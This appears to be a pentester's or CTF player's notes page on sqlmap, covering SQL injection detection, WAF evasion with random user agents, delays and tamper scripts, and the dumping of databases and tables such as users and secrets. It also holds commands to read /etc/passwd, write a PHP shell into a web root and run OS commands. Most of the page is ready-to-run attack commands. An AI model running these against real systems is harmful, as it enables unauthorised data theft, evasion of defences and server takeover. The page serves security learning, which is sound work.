#tools #web

Automated SQL injection detection and exploitation — handles payload generation, detection technique selection, and data extraction. Saves time once you've confirmed injection manually.

## When to use sqlmap
**Confirm manually first.** Run the boolean-pair test from [[SQL Injection]] (`1=1` vs `1=2`) to prove injection and understand what you're attacking. Then use sqlmap to:
- Speed up multi-table enumeration (schema discovery)
- Find additional injection points you missed
- Automate the extraction workflow (tables → columns → dump)

sqlmap handles the tedious part (generating hundreds of payloads per parameter), but you need to know what injection *is* first.

## Installation
```bash
# Kali Linux
apt install sqlmap

# Or from source
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python3 sqlmap.py -h
```

## Basic usage — the naive attempt
```bash
sqlmap -u 'http://target/search?q=apple*' --dbs
```
The `*` marks the injection point. This often gets blocked by Cloudflare/WAF before you even start. Skip ahead to the "when blocked" section.

## Detection flags — finding injections
```bash
# Test a single parameter
sqlmap -u 'http://target/search?q=test*' --dbs

# Test all parameters (GET + POST + headers)
sqlmap -u 'http://target/search?q=test' --forms --dbs

# Specify POST data
sqlmap -u 'http://target/login' --data='username=admin&password=pass*' --dbs

# Add headers (User-Agent, Cookie, etc.)
sqlmap -u '...' -H 'X-Forwarded-For: 127.0.0.1'
sqlmap -u '...' --cookie='sid=abc123'
```

## When sqlmap gets blocked — common solutions

### Issue: 403 Forbidden / Rate limiting
**Symptom:** Every request returns 403, but curl works fine.

**Root cause:** sqlmap's traffic signature (User-Agent, request pattern) triggers WAF rules. Cloudflare specifically blocks the default sqlmap UA.

**Fix:**
```bash
# Randomize User-Agent
sqlmap -u '...' --random-agent

# Slow down the scan
sqlmap -u '...' --delay=1 --threads=1

# Both together (most reliable)
sqlmap -u '...' --random-agent --delay=1 --threads=1
```

**Verify the app is actually open:**
```bash
curl -i 'http://target/search?q=test'  # Should get 200, not 403
```
If curl gets 403 too, the target itself is blocking your IP or the parameter doesn't exist.

### Issue: Still blocked after randomizing UA
Use a tamper script to modify payloads:
```bash
# space2comment: replace spaces with SQL comments
sqlmap -u '...' --tamper=space2comment --random-agent

# Other tamper scripts:
sqlmap -u '...' --tamper=space2plus          # spaces to +
sqlmap -u '...' --tamper=between             # BETWEEN instead of comparison ops
sqlmap -u '...' --tamper=charunicode         # Unicode-encode chars
```
List all: `sqlmap --list-tampers`

### Issue: "not injectable" despite manual confirmation
**Symptom:** You confirmed `1=1` vs `1=2` work manually, but sqlmap says "not injectable."

**Root cause:** Wrong TRUE marker. sqlmap compares responses to find differences; if you give it the wrong "this is TRUE" response, it declares "no difference found."

**Fix — specify the exact TRUE response:**
```bash
# Method 1: String match
sqlmap -u '...' --string='"exists":true'

# Method 2: Regex (if response is complex)
sqlmap -u '...' --regexp='exists.*true'

# Method 3: Text from the response
sqlmap -u '...' --string='Welcome, alice'
```

Capture a TRUE response (when your condition is true) and copy the exact text or regex that identifies it.

## Exploitation workflow — what to dump

### 1. Find databases
```bash
sqlmap -u '...' --dbs
# Returns: information_schema, mysql, db_name, ...
```

### 2. Find interesting tables
```bash
sqlmap -u '...' -D db_name --tables
# Returns: users, products, orders, secrets, ...
```
Look for tables with data you need: `users`, `secrets`, `flags`, `passwords`, `admin_notes`.

### 3. Find columns in a table
```bash
sqlmap -u '...' -D db_name -T users --columns
# Returns: id, username, password, email, role, ...
```

### 4. Dump the table
```bash
sqlmap -u '...' -D db_name -T users --dump
```
If there's a lot of data, sqlmap will ask if you want to dump all or stop after N rows.

### Full exploitation chain
```bash
# Start with detection
sqlmap -u 'http://target/search?q=test*' --dbs

# Once confirmed, find target
sqlmap -u '...' -D target_db --tables

# Extract interesting table
sqlmap -u '...' -D target_db -T secrets --dump

# Or specific columns
sqlmap -u '...' -D target_db -T secrets -C flag,id --dump
```

## Database-specific considerations

### SQLite (local files)
```bash
# SQLite stores everything in sqlite_master table
sqlmap -u '...' --tables     # Reads sqlite_master

# Can also read arbitrary files
sqlmap -u '...' --file-read='/etc/passwd'
```

### MySQL/MariaDB
```bash
# information_schema has schema info
sqlmap -u '...' --schema     # Dump entire schema

# Can write files to disk (if FILE privilege)
sqlmap -u '...' --file-write='/tmp/shell.php' --file-dest='/var/www/html/shell.php'
```

### PostgreSQL
```bash
# pg_tables has schema info
sqlmap -u '...' --schema

# Can run OS commands (if super-user)
sqlmap -u '...' --os-cmd='id'
```

## Advanced flags

| Flag | What it does |
| --- | --- |
| `--batch` | Auto-answer all prompts (don't ask, assume yes) |
| `--crawl=2` | Crawl the site 2 levels deep, test all found parameters |
| `--level=5 --risk=3` | Aggressive testing (slower, more payloads, more detection risk) |
| `--technique=BEUSTQ` | Specify which techniques: Boolean, Error, Union, Stacked, Time-based, Inline |
| `--time-sec=10` | For time-based blind, how long to wait for response (default 5) |
| `--retries=3` | Retry failed requests 3 times |
| `--keep-alive` | Use persistent connection (faster) |
| `--null-connection` | HEAD requests only (stealth, but limited data) |
| `--answers='crack=Y'` | Auto-answer specific prompts (e.g., "crack hashes?") |

## Common gotchas

| Gotcha | What goes wrong | Fix |
| --- | --- | --- |
| `--prefix/--suffix` forced blindly | Produces double values (`alicealice'`), breaks detection | Let sqlmap discover context first; only use if manual testing requires it |
| Wrong table name | Dumps the wrong table or gets nothing | Use `--tables` first to see what's available; verify table name matches |
| Output encoding issues | Binary/special chars show as `\x00` or `???` | Try `--charset=utf8` or `--no-cast` |
| Session expires mid-dump | sqlmap disconnects, dump stops halfway | Use `--cookie='sid=...'` to keep session active, or `--batch` to auto-retry |
| Too much output | Millions of rows, scan takes hours | Use `-C column_list` to dump only columns you need, or `--dump-format=CSV` to save to file |

## Quick reference
```bash
# Safest first attempt (likely to succeed)
sqlmap -u 'http://target/search?q=test*' \
  --random-agent \
  --delay=1 \
  --threads=1 \
  --string='<exact TRUE text from manual test>' \
  --dbs

# Once confirmed, full exploitation
sqlmap -u '...' \
  --random-agent \
  --delay=1 \
  -D database_name \
  -T target_table \
  --dump \
  --batch

# If still blocked
sqlmap -u '...' \
  --random-agent \
  --tamper=space2comment \
  --delay=1.5 \
  --threads=1 \
  --dbs
```

## See also
- [[SQL Injection]] — manual testing workflow, blind extraction technique, fingerprinting
- [[Payload Reference]] — example payloads to test manually first
